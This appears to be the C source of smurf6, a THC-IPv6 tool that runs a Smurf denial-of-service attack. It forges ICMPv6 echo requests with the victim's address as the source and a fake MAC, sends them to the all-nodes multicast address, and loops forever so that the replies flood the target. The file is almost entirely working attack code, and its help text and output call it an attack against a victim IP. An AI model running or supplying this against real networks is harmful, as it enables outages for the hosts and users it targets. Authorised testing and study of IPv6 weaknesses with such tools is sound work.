#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

void help(char *prg) {
  printf("%s %s (c) 2013 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-i microseconds] interface victim-ip "
      "[multicast-network-address]\n\n",
      prg);
  printf(
      "Smurf the target with icmp echo replies. Target of echo request is "
      "the\n");
  printf("local all-nodes multicast address if not specified\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  unsigned char *pkt = NULL, buf[16], fakemac[7] = "\x00\x00\xde\xad\xbe\xef";
  unsigned char *multicast6, *victim6;
  int            i, pkt_len = 0, msec = 0;
  char *         interface;
  int            rawmode = 0;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  // if (strcmp(argv[1], "-r") == 0) {
  //   thc_ipv6_rawmode(1);
  //   rawmode = 1;
  //   argv++;
  //   argc--;
  // }

  while ((i = getopt(argc, argv, "i:")) >= 0) {
    switch (i) {
      case 'i':
        msec = atoi(optarg);
        break;
      default:
        fprintf(stderr, "Error: unknown option -%c\n", i);
        exit(-1);
    }
  }

  interface = argv[optind];
  if (thc_get_own_ipv6(interface, NULL, PREFER_GLOBAL) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  victim6 = thc_resolve6(argv[optind + 1]);
  if (argv[optind + 2] != NULL)
    multicast6 = thc_resolve6(argv[optind + 2]);
  else
    multicast6 = thc_resolve6("ff02::1");

  memset(buf, 'A', 16);
  if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len,
                                      victim6, multicast6, 0, 0, 0, 0, 0)) ==
      NULL)
    return -1;
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_PINGREQUEST, 0, 0xfacebabe,
                    (unsigned char *)&buf, 16, 0) < 0)
    return -1;
  if (thc_generate_pkt(interface, fakemac, NULL, pkt, &pkt_len) < 0) {
    fprintf(stderr, "Error: Can not generate packet, exiting ...\n");
    exit(-1);
  }

  printf("Starting smurf6 attack against %s (Press Control-C to end) ...\n",
         argv[optind + 1]);
  while (1) {
    thc_send_pkt(interface, pkt, &pkt_len);
    if (msec != 0) usleep(msec);
  }

  return 0;
}
